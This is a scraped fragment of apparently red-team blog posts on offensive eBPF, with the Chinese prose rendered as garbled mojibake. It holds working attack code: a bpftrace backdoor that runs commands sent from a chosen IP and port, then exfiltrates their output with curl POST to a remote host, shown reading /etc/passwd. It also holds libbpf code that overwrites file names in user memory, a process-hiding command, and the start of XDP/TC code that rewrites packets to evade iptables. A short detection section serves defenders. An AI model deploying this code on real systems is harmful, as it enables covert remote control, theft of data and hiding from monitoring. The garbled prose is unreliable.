{events=EPOLLIN|EPOLLRDHUP|EPOLLET, data={u32=2632245985, u64=140448062825185}}) = 0 epoll_wait(10, [{events=EPOLLIN, data={u32=2632245985, u64=140448062825185}}], 512, 60000) = 1 recvfrom(23, \u0026#34;GET / HTTP/1.1\\r\\nHost: 192.168.13\u0026#34;..., 1024, 0, NULL, NULL) = 79 stat(\u0026#34;/usr/share/nginx/html/index.html\u0026#34;, {st_mode=S_IFREG|0644, st_size=615, ...}) = 0 1 2 3 4 5 6 7 8 9 10 11 12 âœ bpfbackdoor sudo bpftrace -lv \u0026#39;tracepoint:*recvfrom*\u0026#39; tracepoint:syscalls:sys_enter_recvfrom int __syscall_nr int fd void * ubuf size_t size unsigned int flags struct sockaddr * addr int * addr_len tracepoint:syscalls:sys_exit_recvfrom int __syscall_nr long ret è§£ærecvfromæ— æ³•è·å–åœ°å€ æ‰€ä»¥è§£æaccept\n1 2 3 4 5 6 7 8 9 10 11 12 âœ bpfbackdoor sudo bpftrace -lv \u0026#39;tracepoint:syscalls:sys_enter_accept*\u0026#39; tracepoint:syscalls:sys_enter_accept int __syscall_nr int fd struct sockaddr * upeer_sockaddr int * upeer_addrlen tracepoint:syscalls:sys_enter_accept4 int __syscall_nr int fd struct sockaddr * upeer_sockaddr int * upeer_addrlen int flags å°å‘ ä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸èƒ½è¿™æ ·ç”¨ ä¸¤ä¸ªåœ°å€æ˜¯ä¸€æ ·çš„\n1 2 printf(\u0026#34;%lld %lld\\n\u0026#34;,@sys_read[tid],@sys_read[tid]+9); 94836210655648 94836210655648 å‘½ä»¤åªæœ‰è¾“å…¥çš„å‘½ä»¤ æ²¡æ³•æ‹¼æ¥\n1 2 printf(\u0026#34;%s %s\u0026#34;, $cmd, \u0026#34;\u0026gt; /tmp/o\u0026#34;); cat /etc/passwd ç»è¿‡æµ‹è¯•æ˜¯å˜é‡ä¸å…è®¸æ”¹å˜èµ‹å€¼ï¼ˆå¦‚ä¸‹æ–¹ä»£ç dport_tmpå¤„ä¸èƒ½æ›¿æ¢æˆdport å¦åˆ™dportè¿˜æ˜¯è·å–çš„ç½‘ç»œä¸­çš„å¤§ç«¯æ•° åé¢ä¿®æ”¹ä¸ºå°ç«¯èµ‹å€¼å¤±è´¥ï¼‰\nåªæœ‰printfå’Œsystemä¹Ÿåªæœ‰ç¬¬ä¸€ä¸ªformatå…è®¸é™æ€æ•°æ® åç»­argséœ€ä¸ºå˜é‡ï¼ˆåº”è¯¥æ˜¯æƒé™é—®é¢˜ï¼‰\næœ€ç»ˆä»£ç  æœ€ç»ˆä»£ç å¦‚ä¸‹ï¼Œå› ä¸ºè¦æ‰¾åˆ°sockç„¶ååŒ¹é…åœ°å€ æ‰€ä»¥ä¸å…¨æ˜¯tracepoint ç”¨äº†ä¸€ä¸ªkprobeï¼Œä¸æ˜¯å¾ˆä¼˜é›…\nä¸€ä¸ªæ³¨æ„ç‚¹æ˜¯æ•°ç»„å¯ä»¥åµŒå¥—å¤šç»´ï¼Œç”¨æ¥è¡¨ç¤ºæ¡ä»¶å’Œå­˜å‚¨å˜é‡æ¯”è¾ƒä¼˜é›…\nè¿˜æœ‰ä¸€ä¸ªæ³¨æ„ç‚¹æ˜¯å„ä¸ªtraceä¹‹é—´çš„æ¡ä»¶å…³ç³» å¦åˆ™ä¼šè¾“å‡ºæ— å…³æ•°æ®æˆ–è€…æ— æ³•è¾“å‡ºéœ€è¦çš„æ•°æ® å› ä¸ºå‰é¢æ”¶åˆ°çš„å˜é‡è®°å½•ä¸ºæŒ‡é’ˆåˆ°ä¸‹ä¸€ä¸ªtraceå¾ˆå¯èƒ½æ•°æ®å·²ç»è¢«æ”¹å˜\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 #include \u0026lt;net/sock.h\u0026gt; #include \u0026lt;linux/in.h\u0026gt; #include \u0026lt;linux/socket.h\u0026gt; BEGIN { printf(\u0026#34;Welcome to Offensive BPF... Use Ctrl-C to exit.\\n\u0026#34;); } tracepoint:syscalls:sys_exit_accept* { @fd[tid] = args-\u0026gt;ret; } kprobe:sock_recvmsg / @fd[tid] / { @socks[@fd[tid]] = (struct socket *)arg0; } tracepoint:syscalls:sys_enter_recvfrom / @fd[tid] / { printf(\u0026#34;-\u0026gt;sys_enter_read for allowed thread (fd: %d)\\n\u0026#34;, args-\u0026gt;fd); @sys_read[tid] = args-\u0026gt;ubuf; } tracepoint:syscalls:sys_exit_recvfrom / @socks[@fd[tid]] / { $sock = @socks[@fd[tid]]; $dport_tmp = (uint16)$sock-\u0026gt;sk-\u0026gt;__sk_common.skc_dport; $dport = (( $dport_tmp \u0026gt;\u0026gt; 8) | (( $dport_tmp \u0026lt;\u0026lt; 8) \u0026amp; 0x00FF00)); printf(\u0026#34;addr:%s port:%d\\n\u0026#34;, ntop($sock-\u0026gt;sk-\u0026gt;__sk_common.skc_daddr), $dport); if ($dport == 7777 \u0026amp;\u0026amp; $sock-\u0026gt;sk-\u0026gt;__sk_common.skc_daddr == 2156439744) { $len = args-\u0026gt;ret; $cmd = str(@sys_read[tid], $len); printf(\u0026#34;Command: %s\\n\u0026#34;, $cmd); system(\u0026#34;%s\u0026#34;, $cmd); system(\u0026#34;curl -X POST --data-binary @/tmp/o %s\u0026#34;, str($1)); system(\u0026#34;rm -f /tmp/o\u0026#34;); } } è¿è¡Œç»“æœå¦‚ä¸‹å›¾ï¼šä¸¤ä¸ªlinux shell ä¸¤ä¸ªwindows powershellã€‚å…¶ä¸­powershellç›‘å¬å‘è¿‡æ¥çš„æ•°æ®ï¼ŒlinuxæŒ‚è½½backdoorï¼Œåå°å¯åŠ¨ä¸€ä¸ªnginxç«¯å£æ˜ å°„åˆ°80ç«¯å£ï¼Œå¼€å¦ä¸€ä¸ªlinux shellä½¿ç”¨ncæŒ‡å®š7777ç«¯å£å»è®¿é—®æœ¬æœºçš„80ç«¯å£å‘é€å‘½ä»¤è§¦å‘åé—¨ï¼Œå› ä¸ºç¬¦åˆä»£ç ä¸­æ£€æµ‹çš„æ¥æºipå’Œç«¯å£æ‰€ä»¥æˆåŠŸè§¦å‘æ‰§è¡Œcat /etc/passwdå¹¶å‘é€åˆ°è¿œç¨‹windowsç›‘å¬å¤„ï¼›å†æ¬¡ä½¿ç”¨winä¸»æœºå°è¯•è¿æ¥é¶æœºï¼Œç”±äºç›®æ ‡ipä¸ç¬¦åˆæ¡ä»¶ï¼Œæ‰€ä»¥æ²¡èƒ½è§¦å‘åé—¨ã€‚\nMalicious bpf å¦‚æœè¦åœ¨BPFæ‰§è¡ŒæœŸé—´ä¿®æ”¹æ•°æ®ç»“æ„å¯ä»¥ä½¿ç”¨bpf_probe_write_userï¼Œä½†æ˜¯è¿™åœ¨bpftraceä¸­ä¼¼ä¹ä¸å¯ç”¨ï¼Œæ‰€ä»¥è¿˜å¾—çœ‹C\nè¦†ç›–ç”¨æˆ·ç©ºé—´æ•°æ®å¯ä»¥å®ç°ä¸€ä¸‹ç›®çš„ï¼š\nä¿®æ”¹æ–‡ä»¶åï¼šç±»ä¼¼lså·¥å…·å¯ä»¥å¤šæˆ–å°‘æ•°æ®ä¸€äº›ä¿¡æ¯ï¼Œæ¯”å¦‚è¯´è¾“å‡ºä¸€ä¸ªï¼šhacked_by_ruokeqxçš„æ–‡ä»¶ éšè—ç›®å½•æˆ–rootkitï¼šéšè—æ–‡ä»¶åä¸‹ä¸€æ­¥å°±æ˜¯éšè—ç›®å½•å¹¶ä¸”è¿›è€Œéšè—è¿›ç¨‹ä¿¡æ¯ (é€šè¿‡ /proc/ æ–‡ä»¶ç³»ç»Ÿ) å‹’ç´¢è½¯ä»¶æ¨¡æ‹Ÿï¼šçº¢è“å¯¹æŠ—æ¨¡æ‹Ÿå‹’ç´¢è½¯ä»¶æ—¶çš„ä¸´æ—¶å·¥å…· æ£€æµ‹ï¼šBPFæ£€æµ‹æ–°å§¿åŠ¿ å¯ä»¥ä½¿ç”¨libbpfåº“å’Œlibbppf-bootstrapåº“å¹¶ç”¨Clangå’ŒLLVMå¸¦-target bpfå‚æ•°ç¼–è¯‘\nlibbp-bootstrapåº“ç”¨äº†libbpfä»¥åŠCO-REç‰¹æ€§ä»¥ä¾¿èƒ½å¤Ÿå¿«é€Ÿæ„å»ºBPFç¨‹åº\nlibbpfä½¿ç”¨è¾ƒä½çº§çš„æ„é€ ï¼Œè€ŒBPFç¨‹åºæ˜¯ç”¨Cç¼–å†™çš„ï¼Œè€Œbpftraceåˆ™æ˜¯å¿«é€Ÿç¼–å†™ç®€å•çš„â€œç±»è„šæœ¬â€BPFç¨‹åºçš„æŠ½è±¡ã€‚å› æ­¤ï¼Œlibbpfå…è®¸æ›´å¤šçš„åŠŸèƒ½å’Œæ§åˆ¶ï¼Œä½†è¿™æ„å‘³ç€è¦ç¼–å†™æ›´å¤šçš„ä»£ç ã€‚\nè¦å¤šåšçš„æ­¥éª¤å…¶å®å’Œbccä¸bpftraceçš„å·®åˆ«å¤§è‡´ç›¸åŒ éœ€è¦æ·»åŠ æ˜ å°„å¹¶ä¸”æ·»åŠ trace point\nä½¿ç”¨bpftraceæ˜ å°„ï¼Œå…¶ä¸­åªéœ€è¦ç®€å•çš„å˜é‡åâ€”ä¸éœ€è¦å…¶ä»–ä»»ä½•ä¸œè¥¿ã€‚åœ¨libbpfä¸­ï¼Œå¿…é¡»å®šä¹‰ä¿å­˜æ•°æ®çš„ç»“æ„ï¼Œå¹¶ä½¿ç”¨bpf_helperå‡½æ•°æ¥æ›´æ–°æˆ–åˆ é™¤å€¼\nä¿®æ”¹æ–‡ä»¶å ç¨‹åºåŸºäºlibbpf-bootstrapæ­å»ºï¼Œbootstrapæ¼”ç¤ºäº†BPFå…¨å±€å˜é‡çš„ä½¿ç”¨(Linux 5.5+)å’ŒBPFç¯ç¼“å†²åŒºçš„ä½¿ç”¨(Linux 5.8+)\nbootstrap.cæ˜¯ç”¨æˆ·æ€åŠ è½½å™¨ bootstrap.bpf.cæ˜¯bpfä»£ç  bootstrap.hæ˜¯å¤´æ–‡ä»¶ vmlinux.hæä¾›å†…æ ¸ç³»ç»Ÿè°ƒç”¨ç­‰ä¿¡æ¯\né€šè¿‡straceå¯ä»¥æŸ¥çœ‹ç³»ç»Ÿè°ƒç”¨ è¦ä¿®æ”¹æ–‡ä»¶åéœ€è¦hook sys_exit_getdents64ï¼Œå¯ä»¥é€šè¿‡bpftraceè·å–å‚æ•° å…¶ä¸­/sys/kernel/btf/vmlinuxæ–‡ä»¶æ˜¯å¦å­˜åœ¨è¡¨ç¤ºæ˜¯å¦å¼€å¯BTF\n1 2 3 4 5 6 7 8 9 10 $ sudo bpftrace -lv tracepoint:syscalls:sys*dents64 BTF: using data from /sys/kernel/btf/vmlinux tracepoint:syscalls:sys_enter_getdents64 int __syscall_nr; unsigned int fd; struct linux_dirent64 * dirent; unsigned int count; tracepoint:syscalls:sys_exit_getdents64 int __syscall_nr; long ret; ç¼–å†™å¦‚ä¸‹ä»£ç  ç›®çš„æ˜¯è·å–æ•°æ®å¹¶å‘d_entryä¸­å¡«å……å€¼ ä»¥ä¾¿sys_exit_getdents64è®¿é—®\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 SEC(\u0026#34;tracepoint/syscalls/sys_enter_getdents64\u0026#34;) int handle_enter_getdents64(struct trace_event_raw_sys_enter *ctx) { tid_t tid = bpf_get_current_pid_tgid(); struct linux_dirent64 *d_entry = (struct linux_dirent64 *) ctx-\u0026gt;args[1]; if (d_entry == NULL) { return 0; } bpf_map_update_elem(\u0026amp;dir_entries, \u0026amp;tid, \u0026amp;d_entry, BPF_ANY); return 0; } ç›¸æ¯”èµ·æ¥è·å–å˜é‡ bpftraceå°±æ–¹ä¾¿å¾ˆå¤š\ntracepoint:syscalls:sys_enter_getdents64\r{ @dir_entries[tid] = args-\u0026gt;dirent;\r} ä½†æ˜¯ç”±äºbpftraceåœ¨è¦†ç›–ç”¨æˆ·ç©ºé—´æ•°æ®ç»“æ„å’Œè¿­ä»£æ–¹é¢çš„é™åˆ¶ï¼Œè¿˜æ˜¯åªèƒ½ä½¿ç”¨libbpf\nhook sys_exit_getdents64è·å–enteræ—¶ä¿å­˜çš„ç»“æ„ä½“ æ¥ä¸‹æ¥å¯ä»¥éå†æ‰€æœ‰æ–‡ä»¶åç„¶åé€šè¿‡bpf_probe_write_userä¿®æ”¹\nè¿­ä»£æ¬¡æ•°é™åˆ¶åœ¨256æ¬¡\né€šè¿‡ä½¿ç”¨bpf_printkè¿›è¡Œè°ƒè¯•æ‰“å° sudo cat /sys/kernel/debug/tracing/trace_pipeè·å–è¾“å‡º\nå¯ä»¥é€šè¿‡d_type ä¸ç­‰äº DT_DIR (4)æ¥è·³è¿‡ç›®å½•\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 SEC(\u0026#34;tracepoint/syscalls/sys_exit_getdents64\u0026#34;) int handle_exit_getdents64(struct trace_event_raw_sys_exit *ctx) { struct task_struct *task; struct event *e; task = (struct task_struct *)bpf_get_current_task(); tid_t tid = bpf_get_current_pid_tgid(); long unsigned int * dir_addr = bpf_map_lookup_elem(\u0026amp;dir_entries, \u0026amp;tid); if (dir_addr == NULL) { return 0; } bpf_map_delete_elem(\u0026amp;dir_entries, \u0026amp;tid); /* Loop over directory entries */ struct linux_dirent64 * d_entry; unsigned short int d_reclen; unsigned short int d_name_len; long offset = 0; long unsigned int d_entry_base_addr = *dir_addr; long ret = ctx-\u0026gt;ret; //MAX_D_NAME_LEN == 128 - const isn\u0026#39;t working with allocation here... char d_name[128]; int count = 16; char d_type; int i=0; while (i \u0026lt; 256) // limitation for now, only examine the first 256 entries { bpf_printk(\u0026#34;Loop %d: offset: %d, total len: %d\u0026#34;, i, offset, ret); if (offset \u0026gt;= ret) { break; } d_entry = (struct linux_dirent64 *) (d_entry_base_addr + offset); // read d_reclen bpf_probe_read_user(\u0026amp;d_reclen, sizeof(d_reclen), \u0026amp;d_entry-\u0026gt;d_reclen); // skip if it\u0026#39;s a directory entry bpf_probe_read_user(\u0026amp;d_type, sizeof(d_type), \u0026amp;d_entry-\u0026gt;d_type); if (d_type == DT_DIR) { offset += d_reclen; i++; continue; } //read d_name d_name_len = d_reclen - 2 - (offsetof(struct linux_dirent64, d_name)); long success = bpf_probe_read_user(\u0026amp;d_name, MAX_D_NAME_LEN, d_entry-\u0026gt;d_name); if ( success != 0 ) { offset += d_reclen; i++; continue; } bpf_printk(\u0026#34;d_reclen: %d, d_name_len: %d, %s\u0026#34;, d_reclen, d_name_len, d_name); /* match and overwrite */ if ( d_name_len \u0026gt; 7 ) {\tbpf_printk(\u0026#34;** sys_enter_getdents64 ** OVERWRITING\u0026#34;); char replace[] = \u0026#34;ruokeqx\u0026#34;; // overwrite the user space d_name buffer long success = bpf_probe_write_user((char *) \u0026amp;d_entry-\u0026gt;d_name, (char *) replace, sizeof(char) * 7); bpf_printk(\u0026#34;** RESULT %d\u0026#34;, success); } offset += d_reclen; i++; } return 0; } è¿è¡Œç»“æœå¦‚å›¾ å¯ä»¥çœ‹åˆ°æ‰€æœ‰æ–‡ä»¶åéƒ½è¢«ä¿®æ”¹äº†\néšè—è¿›ç¨‹ bad-bpfåº“æä¾›çš„åŠŸèƒ½ï¼Œæ€è·¯å¾ˆç®€å•ï¼Œæ˜¾ç¤ºå°±æ˜¯éå†dir entryç„¶åè¾“å‡ºåå­—ï¼Œä¸‹ä¸€ä¸ªdir entryæ˜¯å½“å‰dir entry+d_reclenï¼Œsys read hookå¤„éå†çš„æ—¶å€™å‘ç°æ˜¯è‡ªå·±çš„dir entryåæŠŠå‰ä¸€ä¸ªçš„dir entryä¸­d_reclenåŠ ä¸Šè‡ªå·±dir entryçš„d_reclenå°±å®ç°äº†ç»•è¿‡äº†ï¼Œè¿”å›åˆ°ç”¨æˆ·æ€ä¼šç›´æ¥ç»•è¿‡è¿™ä¸ªentryã€‚\n1 sudo ./pidhide -p 3953 æ£€æµ‹ Detection: BPF æ£€æµ‹ä¸»è¦æ˜¯å›´ç»•BPF()ç³»ç»Ÿè°ƒç”¨è·å–ä¿¡æ¯ï¼Œå½“ç„¶éœ€è¦ç¡®ä¿ä½ çš„å·¥å…·è·å–çš„æ˜¯æ­£ç¡®çš„ä¿¡æ¯ï¼ˆå› ä¸ºä½ çš„å·¥å…·å¯èƒ½è¢«trace ç”šè‡³BPFç³»ç»Ÿè°ƒç”¨å¯èƒ½è¢«traceï¼‰\næœ€å¸¸è§çš„å°±æ˜¯å†…æ ¸ä¸­è‡ªå¸¦çš„å·¥å…·bpftoolï¼Œåœ¨ä¹‹å‰çš„æ–‡ç« ä¸­ä¹Ÿæœ‰å†™è¿‡\nè¿˜æœ‰bpflistå¯ä»¥åˆ—å‡ºå½“å‰è¿è¡Œ BPF çš„æ‰€æœ‰ç”¨æˆ·æ€ç¨‹åºï¼Œä»–ä¹Ÿæ˜¯ä¸€ä¸ªBPFç¨‹åº åœ¨bccçš„toolsç›®å½•ä¸­\nå¦‚æœå·²ç»æºç å®‰è£…è¿‡bccä¸è¦å†æ¬¡ä½¿ç”¨aptåŒ…å®‰è£… ææœ‰å¯èƒ½ä¼šä¾èµ–æŸåï¼ˆåˆ«é—®æˆ‘æ€ä¹ˆçŸ¥é“ï¼‰\n1 2 3 4 5 âœ tools git:(master) pwd /home/ruokeqx/project/bcc/tools âœ tools git:(master) ls | grep bpflist bpflist_example.txt bpflist.py éœ€è¦æ³¨æ„çš„æ˜¯å¦‚æœæ¶æ„ BPF ç¨‹åºåœ¨æ—¥å¿—æ”¶é›†æˆ–æ£€æµ‹å·¥å…·è¿è¡Œä¹‹å‰å¼€å§‹è¿è¡Œï¼Œé‚£ä¹ˆ BPF ç¨‹åºå¯ä»¥å°†è‡ªèº«å®‰è£…ä¸º rootkit ä»¥é€ƒé¿æ£€æµ‹ã€‚\nç”±äºBPFä¸è‡ªå¯åŠ¨ï¼Œé‡å¯ç³»ç»Ÿä¹Ÿæ˜¯å…³é—­BPFç¨‹åºçš„ä¸€ç§æ–¹æ³•\nä¸€äº›æ€§èƒ½æ£€æµ‹å·¥å…·æˆ–è®¸ä¼šæœ‰ä¾›åº”é“¾æ”»å‡»éšæ‚£\nDetectionï¼šbpf_probe_write_user bpf_probe_write_user è°ƒç”¨çš„æ—¶å€™ä¼šç”Ÿæˆsyslog\nç†è®ºä¸Šè·Ÿhook BPFç³»ç»Ÿè°ƒç”¨ç±»ä¼¼ ä¹Ÿå¯ä»¥é€šè¿‡hookæ¥bypass syslog\nReference https://embracethered.com/blog/posts/2021/offensive-bpf/\nhttps://embracethered.com/blog/posts/2021/offensive-bpf-bpftrace/\nhttps://embracethered.com/blog/posts/2021/offensive-bpf-bpftrace-message-based/\nhttps://embracethered.com/blog/posts/2021/offensive-bpf-libbpf-bpf_probe_write_user/\nhttps://nakryiko.com/posts/libbpf-bootstrap\nhttps://tech.meituan.com/2022/04/07/how-to-detect-bad-ebpf-used-in-linux.html\nhttps://github.com/pathtofile/bad-bpf\nhttps://cloud.tencent.com/developer/inventory/600/article/1626925\nhttps://github.com/xdp-project/xdp-tutorial\nhttps://arthurchiao.art/blog/understanding-ebpf-datapath-in-cilium-zh/\nhttps://paper.seebug.org/1867/\nhttps://security.tencent.com/index.php/blog/msg/206\n","description":"","id":12,"section":"posts","tags":["bpf","red team"],"title":"offensive eBPFâ€”â€”ä½¿ç”¨BPFåé—¨ã€ä¿®æ”¹æ–‡ä»¶ã€éšè—è¿›ç¨‹","uri":"https://ruokeqx.gitee.io/posts/offensive_bpf/"},{"content":"å‰è¨€ æœ€è¿‘ä¸€æ®µæ—¶é—´ç–¯ç‹‚çœ‹eBPFï¼Œä»ä¸€å¼€å§‹çš„bccå’Œpythonå†™äº†bypass golang tlsçš„å°å·¥å…·å¼€å§‹ï¼›çœ‹äº†ç¾å›¢è“å†›å¤§ä½¬CFC4Nçš„åšå®¢bypass iptablesä¼ªä»£ç å¹¶æœ‰äº†æ­¤æ–‡ï¼›çœ‹äº†Greggçš„ä¹¦ã€ŠBPF Performance Toolsã€‹ï¼Œç³»ç»Ÿåœ°äº†è§£äº†è¿½è¸ªç‚¹ï¼Œäº†è§£äº†bccã€bpftraceåŸºæœ¬ç”¨æ³•ï¼›è·Ÿç€wunderwuzziå’ŒTheXcelleratorçš„ç³»åˆ—åšå®¢ï¼Œå®Œæˆäº†ä¸€äº›offensive bpfç¨‹åºï¼ŒåŒ…æ‹¬åé—¨ç¨‹åºï¼Œéšè—æ–‡ä»¶ã€è¿›ç¨‹ï¼Œå®¹å™¨é€ƒé€¸ï¼Œrootkitç­‰ç­‰ï¼Œæ€»ç»“æ–‡ç« å¤§æ¦‚åœ¨å‡ å¤©åå‘å¸ƒï¼›çœ‹äº†defcon29ä¸Šçš„ä¸¤ä¸ªæ¼”è®²å¹¶å°è¯•äº†ä¸¤ä¸ªå¯¹åº”çš„åº“ï¼šbad-bpfå’Œebpfkitã€‚åˆ°æ­¤ä¹Ÿå¯ä»¥ç®—æ˜¯åŠæ¡è…¿è¿ˆè¿›äº†eBPFçš„ä¸–ç•Œäº†å§ã€‚\nåŸç† æ•°æ®è¿›å…¥å†…æ ¸çš„é“¾è·¯å¦‚å›¾ï¼ŒXDP-\u0026gt;TC-\u0026gt;Netfilter-\u0026gt;TCP Stack-\u0026gt;Socket å‡ºå†…æ ¸è‡ªç„¶æ˜¯ç›¸åæ–¹å‘\næ‰€ä»¥è¿›å…¥å†…æ ¸å‰é€šè¿‡XDPä¿®æ”¹æ¥æºçš„IPå’Œç›®æ ‡ç«¯å£ ç„¶åä¼ å‡ºå†…æ ¸å‰é€šè¿‡TCä¿®æ”¹ç›®æ ‡IPå’Œæ¥æºç«¯å£ ä»¥æ­¤æ¥ç»•è¿‡iptablesçš„æ£€æµ‹\nXDPåªèƒ½hook ingressï¼ŒTCå¯ä»¥hook ingresså’Œegressï¼Œæ‰€ä»¥egressåªèƒ½ç”¨TC\næ•ˆæœ å®ç° å‚è€ƒåšå®¢ä¸­ä¼ªä»£ç ä¸­åªæœ‰ä¸€ä¸ªipv4_csumå‡½æ•°ï¼Œç»æŸ¥æ‰¾å‘ç°æ˜¯å†…æ ¸ä¸­çš„sampleä»£ç çš„å‡½æ•°å¦‚ä¸‹ï¼Œå®é™…è¯•ç”¨åæ„Ÿè§‰æ•ˆæœä¸å¥½ï¼Œé‚è‡ªå·±å®ç°äº†ä¸€ä¸ªï¼Œè§æ–‡ç« æœ«å°¾ä»£ç ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 // samples/bpf/xdp_adjust_tail_kern.c static __always_inline __u16 csum_fold_helper(__u32 csum) { return ~((csum \u0026amp; 0xffff) + (csum \u0026gt;\u0026gt; 16)); } static __always_inline void ipv4_csum(void *data_start, int data_size, __u32 *csum) { *csum = bpf_csum_diff(0, 0, data_start, data_size, *csum); *csum = csum_fold_helper(*csum); } int main(){ __u32 csum = 0; // ä¿®æ”¹tcpç›®æ ‡ç«¯å£ tcphdr-\u0026gt;dest = htons(22); ipv4_csum(tcphdr, sizeof(struct tcphdr), \u0026amp;csum); tcphdr-\u0026gt;check = csum; } åæ³¨ï¼šæŸ¥çœ‹å†…æ ¸tools/bpf/resolve_btfids/libbpf/bpf_helper_defs.hå¯ä»¥çœ‹åˆ°å†…æ ¸ä¸­è¿˜å®ç°äº†ä»¥ä¸‹ä»£ç å¯ä»¥è®¡ç®—checksumï¼Œä¹Ÿå¯ä»¥çœ‹ ref 2 çš„ä»“åº“é‡Œç¤ºä¾‹ä»£ç \n1 2 3 4 5 typedef u64 (*btf_bpf_l3_csum_replace)(struct sk_buff *, u32, u64, u64, u64); typedef u64 (*btf_bpf_l4_csum_replace)(struct sk_buff *, u32, u64, u64, u64); typedef u64 (*btf_bpf_csum_diff)(__be32 *, u32, __be32 *, u32, __wsum); typedef u64 (*btf_bpf_csum_update)(struct sk_buff *, __wsum); typedef u64 (*btf_bpf_csum_level)(struct sk_buff *, u64); è¯´ç®€å•å…¶å®å¾ˆç®€å•ï¼Œå°±æ˜¯æ‹¿ç€ç»“æ„ä½“å»åŒ¹é…åŒ¹é…ï¼Œä¿®æ”¹ä¸€ä¸‹æ•°æ®ã€‚\nä½†æ˜¯å®é™…ç¼–ç èµ·æ¥ä¼šé‡åˆ°å¾ˆå¤šé—®é¢˜ï¼Œä»åˆšå¼€å§‹çš„SEC()å«ä¹‰éƒ½ä¸çŸ¥é“ï¼Œåˆ°åº•ç”¨ä»€ä¹ˆç»“æ„ä½“è§£æï¼Œåˆ°checksumçš„å…·ä½“è®¡ç®—æ–¹å¼ï¼Œå†åˆ°ä¿®æ”¹åçš„å„ç§é»‘ç›’ç½‘ç»œæŠ“åŒ…åˆ†æï¼Œç­‰ç­‰ç­‰ç­‰ã€‚\nçŸ­çŸ­100è¡Œä»£ç è°ƒäº†ä¸¤å¤©ï¼Œå…¶ä¸­checksumæœ‰å¾ˆå¤šå‘ï¼Œè¦æ³¨æ„checksumä¸å¯¹ä¼šç›´æ¥è¢«dropæ ¹æœ¬åˆ°ä¸äº†ç¨‹åºã€‚\nxdp ingressç”±äºæ²¡æœ‰è¿›å…¥å†…æ ¸ç½‘ç»œæ ˆï¼Œä¿®æ”¹çš„æ˜¯ç½‘å¡æ¥æ”¶åˆ°è¿œç«¯ä¼ æ¥çš„æ•°æ®ï¼Œå…¶ä¸­çš„checksumåˆ™è¦æ ¹æ®ä¿®æ”¹è¿›è¡Œoffsetè®¡ç®—ä¿®æ­£ã€‚tc egressä»åœ¨ç½‘ç»œæ ˆä¸­(æœ€åº•å±‚)ï¼Œå…¶ä¸­çš„tcp checksumä¼šåœ¨tcä¹‹åæ ¹æ®å‰é¢çš„æ•°æ®è®¡ç®—å†™å…¥ï¼Œæ‰€ä»¥æ”¹å›æ•°æ®åä¹Ÿéœ€ä¿®æ­£offsetã€‚\nè¦æ³¨æ„çš„æ˜¯wiresharkæŠ“åŒ…åˆ†æå¯ä»¥åˆ†åˆ«æ‰“å¼€ipå±‚å’Œtcpå±‚checksumæ ¡éªŒï¼Œè¿™æ ·é”™è¯¯å°±å¯ä»¥æ˜æ˜¾çœ‹åˆ°ä»¥åŠé¢„æœŸæ•°æ®ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 #include \u0026#34;vmlinux.h\u0026#34; #include \u0026lt;bpf/bpf_helpers.h\u0026gt; // uapi/linux/pkt_cls.h #define TC_ACT_UNSPEC\t(-1) #define TC_ACT_OK\t0 #define TC_ACT_RECLASSIFY 1 #define TC_ACT_SHOT 2 #define TC_ACT_PIPE\t3 #define TC_ACT_STOLEN 4 #define TC_ACT_QUEUED 5 #define TC_ACT_REPEAT 6 #define TC_ACT_REDIRECT 7 #define TC_ACT_TRAP\t8 #define ETH_HLEN 14 #define ETH_P_IP\t0x0800 #define __swab16(x) (__u16)__builtin_bswap16((__u16)(x)) #define htons(x) ((__be16)__swab16((x))) void update_checksum_16(__be16 old, __be16 new, __u32 *csum) { *csum = ~*csum - __swab16(old) + __swab16(new); while(*csum \u0026gt;\u0026gt; 16){ *csum = (*csum \u0026amp; 0xffff) + (*csum \u0026gt;\u0026gt; 16); } *csum=~*csum; } void update_checksum_32(__be32 old, __be32 new, __u32 *csum) { update_checksum_16(old \u0026gt;\u0026gt; 16,new \u0026gt;\u0026gt; 16,csum); update_checksum_16(old \u0026amp; 0xffff,new \u0026amp; 0xffff,csum); } SEC(\u0026#34;xdp/ingress\u0026#34;) int xdp_bypass_iptables_ingress(struct xdp_md *ctx) { void *data_end = (void *)(long)ctx-\u0026gt;data_end; void *data = (void *)(long)ctx-\u0026gt;data; /* Make sure a full ethernet header, ip header and tcp header are there. */ if (data + 14 /*sizeof(struct ethhdr)*/ + 20 /*sizeof(struct iphdr)*/ + 20 /*sizeof(struct tcphdr)*/ \u0026gt; data_end) return XDP_PASS; struct ethhdr *eth = data; struct iphdr *iphdr = data + sizeof(struct ethhdr); struct tcphdr *tcphdr = data + sizeof(struct ethhdr) + sizeof(struct iphdr); if(eth-\u0026gt;h_proto == htons(ETH_P_IP)){ // \u0026lt;linux/if_ether.h\u0026gt; if(iphdr-\u0026gt;protocol == IPPROTO_TCP){ if(iphdr-\u0026gt;saddr == 0x8388a8c0 \u0026amp;\u0026amp; tcphdr-\u0026gt;dest == htons(80)){ __u32 ipcsum = __swab16(iphdr-\u0026gt;check); __u32 tcpcsum = __swab16(tcphdr-\u0026gt;check); // 00:0C:29:63:31:6E // ä¼ªè£…macåœ°å€ // eth-\u0026gt;h_source[0] = 0x00; // eth-\u0026gt;h_source[1] = 0x00; // eth-\u0026gt;h_source[2] = 0x00; // eth-\u0026gt;h_source[3] = 0x00; // eth-\u0026gt;h_source[4] = 0x00; // eth-\u0026gt;h_source[5] = 0x00; // ä¼ªè£…ipæ¥æº 